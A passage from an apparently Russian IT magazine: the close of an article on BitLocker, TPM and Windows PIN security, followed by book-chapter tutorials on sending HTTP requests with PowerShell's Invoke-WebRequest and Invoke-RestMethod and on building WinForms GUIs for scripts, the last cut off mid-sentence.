количества данных, в Microsoft попытались обойти проблему, предоставив
способ входа в учетную запись по PIN-коду и без пароля. Именно этот спо‐
соб — и только на системах с TPM! — позволяет говорить о безопасности
учетной записи: теперь защищенные DPAPI данные невозможно расшифро‐
вать, не войдя в систему, а войти в систему можно исключительно по PIN-коду
(или через Windows Hello), который будет проверяться аппаратным модулем
TPM. Любое изменение в конфигурации системы (как изменение аппаратной
части, так и загрузка с внешнего накопителя) приведет к тому, что модуль
TPM не отдаст нужный ключ и защищенные данные расшифровать не удастся.
  В итоге в оборудованных TPM системах с Windows 10 и Windows 11 невоз‐
можно взломать PIN-код, а в Windows 11 с новым типом учетных записей
с авторизацией без пароля его невозможно подобрать или использовать
пароль от Microsoft Account, извлеченный из другого компьютера или учетной
записи.


ВЫВОДЫ
Перечитав статью, я понял, что количество информации и многочисленные
отсылки, «но», «если» и «да, но…» способны вскипятить содержимое череп‐
ной коробки не хуже, чем это делает документация Microsoft. Поэтому вместо
заключения я хочу перечислить основные тезисы статьи в формате вопросов
и ответов.
  Шифрование системного диска BitLocker безопасно?
   Да, если в системе есть (и активирован) модуль TPM, Intel PTT или AMD
fTPM. Для полной уверенности можно включить режим шифрования с 256-
битным ключом  (по умолчанию  используется  128-битный). Более  того,
политики безопасности BitLocker можно гибко настраивать (например, тре‐
буя ввести отдельный PIN-код перед загрузкой); об этих настройках я также
планирую написать в одной из следующих статей.
  Но ведь… уязвимости?
   Большинство уязвимостей TPM носит скорее теоретический характер.
Более того, они не распространяются на программную эмуляцию в виде Intel
PTT или AMD fTPM, в которых уязвимостей не обнаружено.
   Реальная уязвимость BitLocker (как, впрочем, и многих других систем
шифрования дисков в Windows) заключается в хранении ключа шифрования
в оперативной памяти компьютера. При использовании TPM системный раз‐
дел разблокируется в процессе загрузки еще до авторизации пользователя
(то есть до запроса пароля или PIN-кода). Существует атака, в ходе которой
модули оперативной памяти физически замораживаются, извлекаются, а их
содержимое считывается и анализируется. Эта атака действительно позволя‐
ет обнаружить ключ шифрования и разблокировать диск. В то же время такая
атака требует оборудованной лаборатории и работы квалифицированного
специалиста; она и подобные ей атаки используются исключительно спец‐
службами при расследовании особо важных дел.
  За что ты так не любишь Windows 10?
  А почему она продолжает работать, если в системе нет TPM? И ладно бы
продолжала работать, так ведь предлагает настроить вход по PIN-коду вмес‐
то пароля! Для справки: скорость перебора паролей NTLM такова, что циф‐
ровой PIN-код, даже состоящий из шести цифр, перебирается за несколько
секунд. Да, эта проблема решается включением TPM (тогда PIN-код подоб‐
рать невозможно), но возникает другая: в учетную запись Microsoft можно
войти, если известен пароль от нее.
  Но ведь можно не использовать учетную запись Microsoft?
   Можно. Но не во всех редакциях Windows. И ты проигрываешь в удобстве
(нарушается пресловутый баланс удобства и безопасности).
  Так ведь и BitLocker доступен не во всех редакциях Windows!
  С точки зрения Microsoft, пользователям «домашней» редакции по опре‐
делению «скрывать нечего». Если ты с этим не согласен — тебе поможет
VeraCrypt, о котором мы поговорим в одной из следующих статей.
   Если я обновлюсь на Windows 11 и зашифрую диск, все станет

безопасно?
   Почти. Не забудь еще выключить вход в учетную запись по паролю; тогда
и только тогда PIN-код будет защищен TPM. И кстати, проконтролируй, куда
конкретно сохраняется ключ восстановления доступа BitLocker. Если в твою
учетную запись Microsoft, то извлечь его оттуда — дело несложное.
  А если не обновлюсь?
  В принципе, сравнимого с практической точки зрения уровня безопас‐
ности можно достичь, используя локальную учетную запись Windows со стой‐
ким уникальным паролем. В теории Windows 11 будет безопаснее за счет
возможности полностью отказаться от способов авторизации, не защищен‐
ных аппаратным способом (TPM).
  Можно ли взломать PIN?
   Да, можно — если в системе нет (или не активирован) TPM. Если же TPM
активен, то аппаратный модуль будет ограничивать скорость перебора,
а через какое‑то время заблокирует дальнейшие попытки.
  А если у меня нет TPM?
   Если  твой  компьютер  оснащен  процессором  Intel  8-го  поколения
или более новым либо AMD Zen или более новым, то, вероятнее всего, фун‐
кциональность TPM у тебя есть в виде эмулятора (Intel PTT, AMD fTPM), просто
не включена в UEFI BIOS. Найди и включи.
   Если же у тебя более старый компьютер, то есть варианты. О них я пла‐
нирую написать в следующей статье.
ТРЮКИ

СЕКРЕТЫ
POWERSHELL





     Андрей Попов
      andpop@mail.ru





            ПИШЕМ HTTP-ЗАПРОСЫ
              И ПАРСИМ СТРАНИЦЫ
                    НА POWERSHELL




В интернете есть множество сервисов, с которыми можно
работать, обращаясь к их ресурсам по протоколу HTTP.
Веб‑разработчики постоянно работают с такими HTTP-зап‐
росами для доступа к функциям внешних API или для тес‐
тирования собственных приложений. PowerShell для обра‐
щения к вебу по HTTP предлагает два стандартных коман‐
длета: Invoke-WebRequest и Invoke-RestMethod.


КОМАНДЛЕТ INVOKE-WEBREQUEST
С помощью командлета Invoke-WebRequest можно направить веб‑серверу
HTTP-запрос и получить от него ответ.


Анализ HTML-страниц
Этот командлет хорошо подходит для анализа HTML-страниц. Еще он умеет
сохранять страницы на локальном диске. В этом он похож на консольную ути‐
литу wget и даже имеет такой псевдоним:


PS C:\Script> Get-Alias wget


CommandType     Name
-----------     ----
Alias           wget -> Invoke-WebRequest

Обратимся с помощью Invoke-WebRequest к какой‑нибудь простой стра‐
нице, например Example Domain.
По умолчанию Invoke-WebRequest выполняет HTTP-запрос с методом GET
к ресурсу на веб‑сервере, адрес ресурса указывается в качестве значения
параметра   -Uri.   В    результате    возвращается    объект    типа
HtmlWebResponseObject, в котором хранится информация об ответе сер‐
вера:


PS C:\Script> $web = Invoke-WebRequest -Uri https://example.com/
index.html
PS C:\Script> $web | Get-Member


   TypeName: Microsoft.PowerShell.Commands.HtmlWebResponseObject
. . .
PS C:\Script> $web


StatusCode        : 200
StatusDescription : OK
Content           : <!doctype html>
                    <html>
                    <head>
                        <title>Example Domain</title>


                        <meta charset="utf-8" />
                        <meta http-equiv="Content-type" content=
"text/html; char
                    set=utf-8" />
                        <meta name="viewport" conten...
RawContent        : HTTP/1.1 200 OK
                    Age: 497890
                    Vary: Accept-Encoding
                    X-Cache: HIT
                    Content-Length: 1256
                    Cache-Control: max-age=604800
                    Content-Type: text/html; charset=UTF-8
                    Date: Mon, 12 Jul 2021 16:05:14 GMT
                    Exp...
Forms             : {}
Headers           : {[Age, 497890], [Vary, Accept-Encoding], [X-Cache
, HIT], [Co
                    ntent-Length, 1256]...}
Images            : {}
InputFields       : {}
Links             : {@{innerHTML=More information...; innerText=More
information
                    ...; outerHTML=<A href="https://www.iana.org/
domains/example
                    ">More information...</A>; outerText=More
information...; ta
                    gName=A; href=https://www.iana.org/domains/
example}}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 1256

В поле StatusCode содержится код ответа от сервера (200 для нашего при‐
мера), в поле StatusDescription — текстовое описание этого ответа (OK).


             PowerShellСовременный





                 Современный PowerShell. Андрей Попов

Эта статья — глава из книги Андрея Попова «Современный PowerShell»,
вышедшей в издательстве «БХВ» в марте этого года. В книге подробно опи‐
сан язык PowerShell и работа с оболочкой Windows PowerShell в Windows
Terminal, взаимодействие с файловой системой, структурированными дан‐
ными и веб‑ресурсами. Автор разбирает управление процессами, службами
и серверами автоматизации, рассказывает, как создать GUI для сценариев
Windows PowerShell, уделяет внимание кросс‑платформенным возможностям
PowerShell в macOS и Linux.
   Если ты администрируешь рабочие станции, серверы или локальные сети
под управлением Windows, книга «Современный PowerShell» поможет тебе
освоить секреты и хитрости этой технологии и автоматизировать множество
рутинных задач.



Содержимое ответа от сервера и HTTP-заголовки
Содержимое ответа от сервера хранится в виде строки в поле Content.
В нашем случае здесь будет записан HTML-код:


PS C:\Script> $web.Content
<!doctype html>
<html>
<head>
    <title>Example Domain</title>


    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html;
charset=utf-8" />
    <meta name="viewport" content="width=device-width,
initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: -apple-system, system-ui, BlinkMacSystemFont,
"Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial,
sans-serif;


    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 2em;
        background-color: #fdfdff;
        border-radius: 0.5em;
        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        div {
            margin: 0 auto;
            width: auto;
        }
    }
    </style>
</head>


<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents.
You may use this
    domain in literature without prior coordination or asking for
permission.</p>
    <p><a href="https://www.iana.org/domains/example">More
information...</a></p>
</div>
</body>
</html>

В поле RawContent записывается полный ответ от сервера с HTTP-заголов‐
ками в начале:


PS C:\Script> $web.RawContent
HTTP/1.1 200 OK
Age: 497890
Vary: Accept-Encoding
X-Cache: HIT
Content-Length: 1256
Cache-Control: max-age=604800
Content-Type: text/html; charset=UTF-8
Date: Mon, 12 Jul 2021 16:05:14 GMT
Expires: Mon, 19 Jul 2021 16:05:14 GMT
ETag: "3147526947+ident"
Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT
Server: ECS (dcb/7F83)


<!doctype html>
<html>
<head>
    <title>Example Domain</title>
. . .

Заголовки ответа тоже хранятся отдельно — в виде хеш‑таблицы в свойстве
headers:


PS C:\Script> $web.headers


Key            Value
---            -----
Age            497890
Vary           Accept-Encoding
X-Cache        HIT
Content-Length 1256
Cache-Control  max-age=604800
Content-Type   text/html; charset=UTF-8
Date           Mon, 12 Jul 2021 16:05:14 GMT
Expires        Mon, 19 Jul 2021 16:05:14 GMT
ETag           "3147526947+ident"
Last-Modified  Thu, 17 Oct 2019 07:18:26 GMT
Server         ECS (dcb/7F83)


Сохранение веб-ресурсов
Для сохранения ответа от сервера в виде локального файла надо при вызове
Invoke-WebRequest использовать ключ -OutFile и указать путь к нужному
файлу. Например, сохраним страницу https://example.com/index.html
в файле page.html в текущем каталоге:


PS C:\Script> Invoke-WebRequest -Uri https://example.com/index.html
-OutFile page.html

Проверим содержимое файла page.html и убедимся, что в нем записана
HTML-разметка сохраненной страницы:


PS C:\Script> type .\page.html
<!doctype html>
<html>
<head>
    <title>Example Domain</title>


    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html;
charset=utf-8" />
    <meta name="viewport" content="width=device-width,
initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: -apple-system, system-ui, BlinkMacSystemFont,
"Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial,
sans-serif;


    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 2em;
        background-color: #fdfdff;
        border-radius: 0.5em;
        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        div {
            margin: 0 auto;
            width: auto;
        }
    }
    </style>
</head>


<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents.
You may use this
    domain in literature without prior coordination or asking for
permission.</p>
    <p><a href="https://www.iana.org/domains/example">More
information...</a></p>
</div>
</body>
</html>


Подобным образом можно сохранять не только HTML-файлы, но и ресурсы
других типов (текстовые, графические или мультимедийные файлы и т. д.),
к которым можно обратиться на сайте.


Поиск HTML-элементов на странице
В свойствах Forms (формы), Images (изображения), InputFields (поля вво‐
да) и Links (ссылки) объекта HtmlWebResponseObject сохраняются массивы
объектов, которые описывают соответствующие элементы HTML-разметки,
полученной  от  сервера.  Обрабатывая  эти  коллекции,  можно  получить
информацию об интересующих нас элементах на загруженной странице.
   Например, сохраним в переменной $web страницу результатов поиска
слова PowerShell в Yandex:


PS C:\Script> $web = Invoke-WebRequest -Uri https://yandex.ru/search/
?text=PowerShell

Выделим на этой странице все ссылки на сайт habr.com. Для этого нужно
отфильтровать массив $web.Links, оставив в нем объекты, у которых зна‐
чение свойства href соответствует маске *habr.com*:


PS C:\Script> $habr_links = $web.Links | Where-Object href -like
'*habr.com*'

В $habr_links находятся два объекта PSCustomObject, содержащие раз‐
личные HTML-атрибуты для ссылок:


PS C:\Script> $habr_links.count
2
PS C:\Script> $habr_links | Get-Member


   TypeName: System.Management.Automation.PSCustomObject


Name          MemberType   Definition
----          ----------   ----------
Equals        Method       bool Equals(System.Object obj)
GetHashCode   Method       int GetHashCode()
GetType       Method       type GetType()
ToString      Method       string ToString()
class         NoteProperty string class=Link Link_theme_normal
OrganicTitl...
data-counter  NoteProperty string data-counter=["b"]
data-log-node NoteProperty string data-log-node=bf7fw01-00
href          NoteProperty string href=https://habr.com/ru/company/
ruvds/b...
innerHTML     NoteProperty string innerHTML=<div class="Favicon
Favicon_si...
innerText     NoteProperty string innerText=...
outerHTML     NoteProperty string outerHTML=<a tabindex="0" class="
Link Li...
outerText     NoteProperty string outerText=...
tabindex      NoteProperty string tabindex=0
tagName       NoteProperty string tagName=A
target        NoteProperty string target=_blank

Например, выведем значение атрибутов href и innerText для этих ссылок:


PS C:\Script> $habr_links | ForEach-Object {$_.href + " - " + $_.
innerText }
https://habr.com/ru/company/ruvds/blog/487876/ -
Что такое Windows PowerShell и с чем его едят? / Хабр
https://habr.com/ru/company/ruvds/blog/487876/ - habr.com›ru/company/
ruvds/blog/487876/

В свойстве ParsedHtml объекта HtmlWebResponseObject содержится объект
типа mshtml.HTMLDocumentClass, который предоставляет доступ к DOM-
дереву загруженной HTML-страницы.


PS C:\Users\andrv> $html = $web.ParsedHtml
PS C:\Users\andrv> Get-Member -InputObject $html


   TypeName: mshtml.HTMLDocumentClass
. . .




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
          СЕКРЕТЫ
       POWERSHELL
                     ПИШЕМ HTTP-ЗАПРОСЫ
             И ПАРСИМ СТРАНИЦЫ НА POWERSHELL





             INFO

                            Если в HTML-коде имеются сценарии JavaScript,
                         то по умолчанию при построении DOM-дерева
                      они будут выполнены. При необходимости выпол‐
                      нение   сценариев  можно   отключить,   указав
                      параметр -UseBasicParsing.


В частности, используя методы getElementById(), getElementsByName()
и getElementsByTagName(), можно получать  объекты,  соответствующие
HTML-элементам с заданным идентификатором, именем или тегом соответс‐
твенно.
   Например, посмотрим, какой текст записан в первом заголовке второго
уровня (HTML-тег <h2>):


PS C:\Users\andrv> $html.getElementsByTagName('h2')[0].innerText


Документация по PowerShell - PowerShell | Microsoft Docs

Найдем элемент с идентификатором search-result:


PS C:\Users\andrv> $html.getElementById('search-result')


className                    : serp-list serp-list_left_yes
id                           : search-result
tagName                      : UL
parentElement                : System.__ComObject
style                        : System.__ComObject
. . .

Метод querySelector() позволяет найти HTML-элемент по определенному
CSS-селектору. Например, обратимся к элементу с классом main__content:


PS C:\Users\andrv> $html.querySelector('.main__content')


className                    : main__content
id                           :
tagName                      : DIV
parentElement                : System.__ComObject
style                        : System.__ComObject
. . .

Подробнее  о   свойствах,  методах  и   событиях   объекта  mshtml.
HTMLDocumentClass можно прочитать в документации на сайте Microsoft.


Выполнение POST-запросов
Командлет Invoke-WebRequest позволяет не только выполнять GET-запросы,
но и вызывать другие методы, определенные в протоколе HTTP  (DELETE,
HEAD, MERGE, PATCH, POST, PUT, TRACE). Для этого нужный метод указывается
в качестве значения параметра -Method.
   Рассмотрим пример выполнения запроса с HTTP-методом POST, который
часто используется для передачи данных из веб‑форм или загрузки файлов
на сервер. Обращаться мы будем к ресурсу http://httpbin.org/post,
в результате сервер должен сообщить нам о полученных данных.
   Передавать мы будем два параметра с именами name и lastName, которые
поместим в хеш‑таблицу $params:


PS C:\Users\andrv> $params = @{name='Andrey'; lastName='Popov'}

Выполним Invoke-WebRequest с методом POST, поместив передаваемые
параметры в тело запроса (параметр -Body):


PS C:\Users\andrv> Invoke-WebRequest -Uri http://httpbin.org/post
-Method POST -Body $params


StatusCode        : 200
StatusDescription : OK
Content           : {
                      "args": {},
                      "data": "",
                      "files": {},
                      "form": {
                        "lastName": "Popov",
                        "name": "Andrey"
                      },
                      "headers": {
                        "Content-Length": "26",
                        "Content-Type": "application/x-www-form..
                    .
RawContent        : HTTP/1.1 200 OK
                    Connection: keep-alive
                    Access-Control-Allow-Origin: *
                    Access-Control-Allow-Credentials: true
                    Content-Length: 503
                    Content-Type: application/json
                    Date: Fri, 16 Jul 2021 03:03:13 GM...
Forms             : {}
Headers           : {[Connection, keep-alive], [Access-Control-Al
                    low-Origin, *], [Access-Control-Allow-Credent
                    ials, true], [Content-Length, 503]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 503

Отправляемые на сервер параметры командлет Invoke-WebRequest авто‐
матически приводит к формату application/x-www-form-urlencoded, который
используется при передаче данных из веб‑форм. Ответ в поле Content
говорит о том, что сервер принял наши параметры и определил, что они были
отправлены из формы.
   Иногда бывает нужно передавать на сервер данные в формате JSON, а не
в application/x-www-form-urlencoded. В этом случае следует указать параметр
-ContentType со значением application/json. Например:


PS C:\Users\andrv> $json_params = "{ 'name':'Andrey', 'lastName':
'Popov' }"
PS C:\Users\andrv> Invoke-WebRequest -Uri http://httpbin.org/post
-ContentType "application/json" -Method POST -Body $json_params


StatusCode        : 200
StatusDescription : OK
Content           : {
                      "args": {},
                      "data": "{ 'name':'Andrey', 'lastName':'Popov
                    ' }",
                      "files": {},
                      "form": {},
                      "headers": {
                        "Content-Length": "39",
                        "Content-Type": "application/json",
                        "Host": "...
RawContent        : HTTP/1.1 200 OK
                    Connection: keep-alive
                    Access-Control-Allow-Origin: *
                    Access-Control-Allow-Credentials: true
                    Content-Length: 475
                    Content-Type: application/json
                    Date: Fri, 16 Jul 2021 03:43:04 GM...
Forms             : {}
Headers           : {[Connection, keep-alive], [Access-Control-Allo
                    w-Origin, *], [Access-Control-Allow-Credentials
                    , true], [Content-Length, 475]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 475

Как видим, при таком способе отправки запроса серверный скрипт, обра‐
батывающий  обращения  к  ресурсу  http://httpbin.org/post,  извлек
полученные данные и при формировании своего JSON-ответа поместил их
в поле data, а не в поле form.


КОМАНДЛЕТ INVOKE-RESTMETHOD
Если мы обращаемся к веб‑сервису, поддерживающему REST API, то ответ
сервера, скорее всего, будет содержать структурированные данные в фор‐
мате JSON или XML. Так, в предыдущем примере мы с помощью командлета
Invoke-WebReques посылали POST-запрос на ресурс http://httpbin.org/
post и получали в ответ JSON-строку:


PS C:\Users\andrv> $web = Invoke-WebRequest -Uri http://httpbin.org/
post -Method POST -Body @{name='Andrey'; lastName='Popov'}
PS C:\Users\andrv> $web.Content
{
  "args": {},
  "data": "",
  "files": {},
  "form": {
    "lastName": "Popov",
    "name": "Andrey"
  },
  "headers": {
    "Content-Length": "26",
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "httpbin.org",
    "User-Agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; ru-RU)
WindowsPowerShell/5.1.19041.1023",
    "X-Amzn-Trace-Id": "Root=1-60f2a42c-18f152db3b76b5d66d173e31"
  },
  "json": null,
  "origin": "85.95.179.209",
  "url": "http://httpbin.org/post"
}

Чтобы работать с полями ответа, мы должны преобразовать JSON в объект
PowerShell с помощью командлета ConvertFrom-Json:


PS C:\Users\andrv> $response = $web.Content | ConvertFrom-Json
PS C:\Users\andrv> $response


args    :
data    :
files   :
form    : @{lastName=Popov; name=Andrey}
headers : @{Content-Length=26; Content-Type=application/x-www-form-
urlencoded; Host=htt
          pbin.org; User-Agent=Mozilla/5.0 (Windows NT; Windows NT 10
.0; ru-RU) Windows
          PowerShell/5.1.19041.1023; X-Amzn-Trace-Id=Root=1-60f2a42c-
18f152db3b76b5d66d
          173e31}
json    :
origin  : 85.95.179.209
url     : http://httpbin.org/post


PS C:\Users\andrv> $response.form.name
Andrey

В подобных случаях, когда от сервера мы получаем структурированные дан‐
ные, удобнее пользоваться командлетом Invoke-RestMethod, который дей‐
ствует аналогично Invoke-WebRequest и имеет такие же параметры, но при
этом автоматически преобразует ответ от сервера в объект PowerShell.
   Выполним наш запрос с помощью Invoke-RestMethod, сохранив резуль‐
тат в переменной $result:


PS C:\Users\andrv> $result = Invoke-RestMethod -Uri http://httpbin.
org/post -Method POST -Body @{name='Andrey'; lastName='Popov'}

Проверим тип и содержимое переменной $result:


PS C:\Users\andrv> Get-Member -InputObject $result


   TypeName: System.Management.Automation.PSCustomObject


Name        MemberType   Definition
----        ----------   ----------
Equals      Method       bool Equals(System.Object obj)
GetHashCode Method       int GetHashCode()
GetType     Method       type GetType()
ToString    Method       string ToString()
args        NoteProperty System.Management.Automation.PSCusto...
data        NoteProperty string data=
files       NoteProperty System.Management.Automation.PSCusto...
form        NoteProperty System.Management.Automation.PSCusto...
headers     NoteProperty System.Management.Automation.PSCusto...
json        NoteProperty object json=null
origin      NoteProperty string origin=85.95.179.209
url         NoteProperty string url=http://httpbin.org/post
PS C:\Users\andrv> $result


args    :
data    :
files   :
form    : @{lastName=Popov; name=Andrey}
headers : @{Content-Length=26; Content-Type=application/x-www-form-
urlencoded; Host=htt
          pbin.org; User-Agent=Mozilla/5.0 (Windows NT; Windows NT 10
.0; ru-RU) Windows
          PowerShell/5.1.19041.1023; X-Amzn-Trace-Id=Root=1-60f2a897-
6354ce272644b6d412
          560a9b}
json    :
origin  : 85.95.179.209
url     : http://httpbin.org/post

Как видим, вместо строки в формате JSON мы получаем PowerShell-объект
типа  System.Management.Automation.PSCustomObject  и  можем  сразу
обращаться к нужным свойствам:


PS C:\Users\andrv> $result.form.lastName
Popov


ИТОГИ
Итак, для обращения к веб‑ресурсам по протоколу HTTP в PowerShell име‐
ются  два   стандартных   командлета:  Invoke-WebRequest  и  Invoke-
RestMethod. Для  выполнения  HTTP-запросов  к  веб‑ресурсам,  возвра‐
щающим  HTML-страницы,  удобнее  использовать  командлет  Invoke-
WebRequest, а для работы с внешними REST API, возвращающими струк‐
турированные данные, лучше подойдет командлет Invoke-RestMethod.
   Действуют эти командлеты аналогично друг другу, за исключением того,
что Invoke-RestMethod автоматически преобразует ответ от сервера в объ‐
ект PowerShell.
ТРЮКИ

СЕКРЕТЫ
POWERSHELL





     Андрей Попов
      andpop@mail.ru





                       СОЗДАЕМ
           ГРАФИЧЕСКИЙ ИНТЕРФЕЙС
                   ДЛЯ СЦЕНАРИЕВ




Работая в терминале, мы управляем сценариями PowerShell
с помощью параметров, которые указываются в командной
строке при их вызове. Если с нашим сценарием будут
работать обычные пользователи, то, добавив к нему простой
графический  интерфейс,  можно  избавить  их  от  необ‐
ходимости вводить названия параметров. О том, как при‐
делать GUI к сценариям PowerShell, я сейчас расскажу.


В Windows PowerShell доступны два варианта создания GUI с помощью объ‐
ектов .NET Framework. Классические элементы интерфейса Windows можно
добавить с помощью библиотеки .NET Windows Forms (WinForms), которая
поддерживалась в .NET c самого начала. Более современный вариант дизай‐
на реализуется с помощью технологии Windows Presentation Foundation (WPF),
которая была добавлена позже в .NET Framework 3.0.


             PowerShellСовременный





                 Современный PowerShell. Андрей Попов

Эта статья — глава из книги Андрея Попова «Современный PowerShell»,
вышедшей в издательстве «БХВ» в марте этого года. В книге подробно опи‐
сан язык PowerShell и работа с оболочкой Windows PowerShell в Windows
Terminal, взаимодействие с файловой системой, структурированными дан‐
ными и веб‑ресурсами. Автор разбирает управление процессами, службами
и серверами автоматизации, рассказывает, как создать GUI для сценариев
Windows PowerShell, уделяет внимание кросс‑платформенным возможностям
PowerShell в macOS и Linux.
   Если ты администрируешь рабочие станции, серверы или локальные сети
под управлением Windows, книга «Современный PowerShell» поможет тебе
освоить секреты и хитрости этой технологии и автоматизировать множество
рутинных задач.



ПОСТРОЕНИЕ GUI С ПОМОЩЬЮ WINDOWS FORMS
Давай создадим простейшую форму с надписью и кнопкой, выполняя коман‐
ды непосредственно в консоли PowerShell.
   Как мы знаем, платформа .NET построена таким образом, что для обра‐
щения к тем или иным объектам нужно предварительно загрузить в операци‐
онную память соответствующую сборку (assembly) — динамическую биб‐
лиотеку определенного вида. Наиболее часто использующиеся сборки заг‐
ружаются в PowerShell автоматически. Для обращения к объектам WinForms
из PowerShell нужно сначала загрузить сборку, поддерживающую эти объ‐
екты:


PS C:\Users\andrv> Add-Type -Assemblyname System.Windows.Forms

Графический интерфейс в терминах WinForms — это набор  элементов
управления (кнопки, поля ввода, списки, флажки и т. д.), которые располага‐
ются в контейнерах (формы, панели, вкладки). Изменяя значения свойств
объектов, соответствующих элементам управления, мы определяем внешний
вид этих элементов (размер, цвет фона, используемый шрифт и т. д.).
   Любое графическое приложение WinForms должно иметь главную фор‐
му — объект типа Windows.Forms.Form. Создадим нашу главную форму
и сохраним соответствующий объект в переменной $form:


PS C:\Users\andrv> $form = New-Object System.Windows.Forms.Form

Наша форма пока находится только в оперативной памяти, на экране мы ее
не видим. Зададим заголовок формы (свойство Text объекта $form):


PS C:\Users\andrv> $form.Text = 'Первая форма'

Поместим на форму надпись — для этого нужно создать объект типа System.
Windows.Forms.Label и присвоить значение свойству Text этого объекта:


PS C:\Users\andrv> $label = New-Object System.Windows.Forms.Label
PS C:\Users\andrv> $label.Text = 'Привет!'

Кроме надписи, на форму можно помещать другие элементы управления,
которым соответствуют объекты из пространства имен System.Windows.
Forms. Некоторые из этих объектов представлены в таблице ниже.


 Об
  ъ-    Описание
 ект

  Butt
          Кнопка на форме. Надпись на кнопке задается свойством Text
 on

 Che
         Флажок (чекбокс) — элемент управления для выбора одного
 ckBo
        или нескольких пунктов из предложенных вариантов
  x

 Che
 cked   Состоит из списка элементов (ListBox), перед каждым из которых
  ListB   помещен флажок (чекбокс) для возможности выбора
  ox

 Com
          Состоит из поля для ввода текста (TextBox) и связанного с ним
 boB
          раскрывающегося списка значений (ListBox)
  ox

 Data
         Основной элемент управления для представления табличных дан‐
  Grid
        ных (поддерживает связь с базой данных)
  View

 Grou    Используется для выделения групп элементов управления (чаще
 pBox   всего радиокнопок), возле которых отображается рамка

          Контейнер для размещения коллекции изображений, исполь‐
 Imag
        зуемых  другими  элементами  управления  (например,  ListView
  eList
        и TreeView)

  ListB   Список элементов, которые могут быть выбраны. Может содер‐
  ox     жать простой текст или объекты

 Pane   Видимый или невидимый контейнер для группировки элементов
    l       управления

  Pictu
           Используется для размещения графических изображений в нес‐
 reBo
          кольких стандартных форматах
  x

 Prog
  ress    Индикатор хода выполнения какого‑либо процесса
 Bar

  Radi
          Переключатель  (радиокнопка)  для  выбора  одного  варианта
 oBut
         из списка предложенных
  ton

  Text
         Элемент для ввода текста в одной или нескольких строках
 Box

  Tree
         Отображение данных в виде узлов дерева
  View

Для задания размеров и расположения элементов управления используются
объекты типа System.Drawing.Point, в которые передаются координаты:
первая — по горизонтали, вторая — по вертикали (начало координат раз‐
мещается в верхнем левом углу, ось X направлена вправо, ось Y — вниз).
Нашу надпись мы сместим от верхнего левого угла на 20 пикселов вправо
и 10 пикселов вниз. Объект с нужными координатами записывается в свой‐
ство Location объекта $label:


PS C:\Users\andrv> $label.Location = New-Object System.Drawing.Point
20,10

Пока надпись представляет собой отдельный объект, который не связан
с основной формой. Поместим надпись на форму, добавив объект $label
в коллекцию $form.Controls с помощью метода Add:


PS C:\Users\andrv> $form.Controls.Add($label)

Теперь создадим кнопку (объект типа Windows.Forms.Button) с надписью
«Нажми!»:


PS C:\Users\andrv> $button = New-Object Windows.Forms.Button
PS C:\Users\andrv> $button.Text = "Нажми!"

Зададим координаты для кнопки:


PS C:\Users\andrv> $button.Location = New-Object System.Drawing.Point
 20,40

Поместим кнопку на форму:


PS C:\Users\andrv> $form.Controls.Add($button)

Теперь добавим нашей форме функциональность — по нажатию кнопки
$button текст в надписи $label будет меняться на «Пока!». Для  этого
с помощью метода Add_Click нужно определить обработчик события Click
на кнопке. В этот метод передается блок кода, который будет выполнен
при нажатии кнопки. В нашем случае достаточно изменить значение свойства
$label.Text:


PS C:\Users\andrv> $button.Add_Click({$label.Text='Пока!'})

Если бы обработчик события был более объемный, то удобнее было бы
заранее сохранить соответствующий блок кода в переменной, которую затем
передать в метод Add_Click.
   Теперь с помощью метода ShowDialog можно отобразить созданную фор‐
му с элементами управления на экране.


PS C:\Users\andrv> $form.ShowDialog()





                     Форма, созданная в PowerShell

По нажатию кнопки надпись на форме изменится.





                    Изменения в элементе на форме

Итак, мы рассмотрели простейший пример создания формы в PowerShell
с помощью библиотеки WinForms. Более сложные интерфейсы реализуются
по той же схеме:
 1. Загружаем сборку System.Windows.Forms.
 2. Создаем объекты, соответствующие главной форме, контейнерам и эле‐
   ментам управления.
 3. Привязываем элементы управления к нужным контейнерам и форме.
 4. Задаем свойства элементов управления, определяющие их внешний вид
   и расположение внутри контейнеров.
 5. Пишем блоки кода для обработчиков событий и привязываем их к элемен‐
   там управления.
 6. Показываем главную форму на экране.

Как видим, при создании графического интерфейса на PowerShell с помощью
WinForms значительная часть работы приходится на написание шаблонного
кода для создания элементов управления и задания их свойств. Конечно,
намного удобнее и проще было бы строить интерфейс с помощью визуаль‐
ного конструктора с дальнейшей автоматической генерацией соответству‐
ющего кода на языке PowerShell. Подобные конструкторы есть в некоторых
платных профессиональных средах разработки для PowerShell (например
в Sapien PowerShell Studio) или в сервисе PowerShell GUI Designer. Из бес‐
платных инструментов можно выделить утилиту PowerShell WinForms Creator,
которая сама написана на PowerShell.
   Таким образом, при работе с WinForms код для описания интерфейса
(создание объектов для элементов управления) оказывается тесно связан‐
ным с кодом, определяющим функциональность сценария  (обработчики
событий на элементах управления и другие функции). Вносить изменения
в такие сценарии неудобно, они быстро разрастаются и становятся слишком
объемными и сложными для понимания.
   Более правильный подход, когда декларативное описание графического
интерфейса  отделяется  от  остального  кода,  обеспечивает  технология
